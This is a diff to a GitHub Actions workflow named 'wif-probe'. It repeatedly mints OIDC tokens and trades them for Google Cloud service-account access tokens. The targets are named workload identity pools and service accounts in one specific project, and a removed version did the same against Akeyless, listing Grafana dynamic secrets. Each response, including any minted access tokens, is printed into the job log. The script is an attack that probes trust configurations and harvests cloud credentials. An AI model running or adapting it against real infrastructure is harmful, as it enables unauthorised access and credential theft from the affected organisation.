@@ -1,4 +1,4 @@
-name: akeyless-probe
+name: wif-probe
 on:
   workflow_dispatch:
 permissions:
@@ -11,21 +11,25 @@ jobs:
       - name: probe
         run: |
           set +e
-          for AUD in akeyless https://akeyless.io https://github.com/celo-org openbao vault; do
-            echo "### AUD=$AUD"
+          PROBE() {
+            POOL="$1"; SA="$2"
+            AUD="//iam.googleapis.com/projects/1094498259535/locations/global/workloadIdentityPools/$POOL/providers/github-by-repos"
+            echo "##### POOL=$POOL SA=$SA"
             RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
-            TOK=$(printf '%s' "$RESP" | jq -r '.value // empty')
-            if [ -z "$TOK" ]; then echo "MINT_FAIL: $(printf '%s' "$RESP" | head -c 200)"; continue; fi
-            echo "token_len=${#TOK}"
-            BODY=$(jq -nc --arg id p-kf9vjzruht6l --arg j "$TOK" '{"access-id":$id,"access-type":"jwt","jwt":$j}')
-            echo "--- auth p-kf9vjzruht6l"
-            AUTH=$(curl -sS -X POST https://api.akeyless.io/auth -H 'Content-Type: application/json' -d "$BODY" -w '\nHTTP %{http_code}')
-            echo "$AUTH" | head -c 1500
-            echo
-            AT=$(printf '%s' "$AUTH" | head -n1 | jq -r '.token // empty' 2>/dev/null)
-            if [ -n "$AT" ]; then
-              echo "--- list-items /dynamic-secrets/keys/grafana/clabs"
-              curl -sS -X POST https://api.akeyless.io/list-items -H 'Content-Type: application/json' -d "$(jq -nc --arg t "$AT" '{token:$t,path:"/dynamic-secrets/keys/grafana/clabs"}')" -w '\nHTTP %{http_code}\n' | head -c 2000
+            OIDC=$(printf '%s' "$RESP" | jq -r '.value // empty')
+            if [ -z "$OIDC" ]; then echo "MINT_FAIL: $(printf '%s' "$RESP" | head -c 300)"; return; fi
+            echo "oidc_len=${#OIDC}"
+            BODY=$(jq -nc --arg a "$AUD" --arg t "$OIDC" '{audience:$a,grantType:"urn:ietf:params:oauth:grant-type:token-exchange",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",scope:"https://www.googleapis.com/auth/cloud-platform",subjectTokenType:"urn:ietf:params:oauth:token-type:jwt",subjectToken:$t}')
+            STS=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "$BODY" -w '\nHTTP %{http_code}')
+            echo "STS: $(printf '%s' "$STS" | head -c 900)"
+            FED=$(printf '%s' "$STS" | head -n1 | jq -r '.access_token // empty' 2>/dev/null)
+            if [ -n "$FED" ]; then
+              echo "--- generateAccessToken $SA"
+              curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' -w '\nHTTP %{http_code}\n' | head -c 1200
               echo
             fi
-          done
+          }
+          PROBE gh-charts-main publish-helm-charts@devopsre.iam.gserviceaccount.com
+          PROBE gh-charts publish-helm-charts@devopsre.iam.gserviceaccount.com
+          PROBE gh-tests-gh-workflows-actions tests-gh-workflows-actions@devopsre.iam.gserviceaccount.com
+          PROBE gh-image-annotator-webhook image-annotator-webhook@devopsre.iam.gserviceaccount.com
